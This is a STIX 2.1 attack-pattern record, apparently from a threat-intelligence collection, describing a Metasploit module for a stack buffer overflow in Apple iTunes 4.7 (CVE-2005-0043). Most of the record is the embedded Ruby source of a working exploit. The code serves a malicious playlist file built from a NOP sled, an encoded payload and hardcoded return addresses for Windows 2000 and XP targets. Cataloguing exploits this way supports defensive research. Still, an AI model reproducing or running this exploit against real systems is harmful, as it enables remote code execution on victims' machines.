{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6cbbfe09-ad4c-4eaa-ab44-21c46ae02d0b",
    "created": "2024-08-14T16:45:07.81173Z",
    "modified": "2024-08-14T16:45:07.811734Z",
    "name": "Apple ITunes 4.7 Playlist Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Apple ITunes 4.7",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_itunes_playlist.rb",
            "external_id": "apple_itunes_playlist.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0043"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple ITunes 4.7 Playlist Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Apple ITunes 4.7\n        build 4.7.0.42. By creating a URL link to a malicious PLS\n        file, a remote attacker could overflow a buffer and execute\n        arbitrary code. When using this module, be sure to set the\n        URIPATH with an extension of '.pls'.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '2005-0043' ],\n          [ 'OSVDB', '12833' ],\n          [ 'BID', '12238' ],\n        ],\n\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro English SP4',\t{ 'Ret' => 0x75033083 } ],\n          [ 'Windows XP Pro English SP2',\t\t{ 'Ret' => 0x77dc2063 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2005-01-11',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    cruft   = rand(9).to_s\n\n    sploit =  make_nops(2545) + payload.encoded + [target.ret].pack('V')\n\n    # Build the HTML content\n    content =  \"[playlist]\\r\\n\" + \"NumberOfEntries=#{cruft}\\r\\n\"\n    content << \"File#{cruft}=http://#{sploit}\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_contributors": [
        "MC",
        ""
    ],
    "x_mitre_disclosure_date": "2005-01-11",
    "x_mitre_platforms": [
        "win'"
    ]
}